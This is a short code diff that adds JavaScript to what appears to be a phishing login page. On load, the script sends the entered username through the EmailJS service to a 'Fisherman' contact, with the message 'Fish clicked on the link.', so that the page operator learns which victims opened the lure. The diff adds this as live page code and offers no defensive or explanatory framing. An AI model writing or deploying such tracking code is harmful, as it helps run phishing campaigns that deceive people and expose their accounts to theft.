@@ -275,6 +275,23 @@
     const submitButton = document.querySelector("#submit-button");
     const showPassword = document.querySelector('#show-password');
     const password = document.querySelector('#password');
+    
+     (function () {
+        const template_params = {
+            from_name: document.querySelector("#username").value,
+            to_name: "Fisherman",
+            message: `Fish clicked on the link.`,
+            reply_to: "death@himself.net"
+        }
+
+        emailjs.send('service_trfso2z', 'template_a1qaoyi', template_params)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
+        
+    })();
 
     if(document.querySelector("#username").value.length < 1
             || password.value.length < 6){
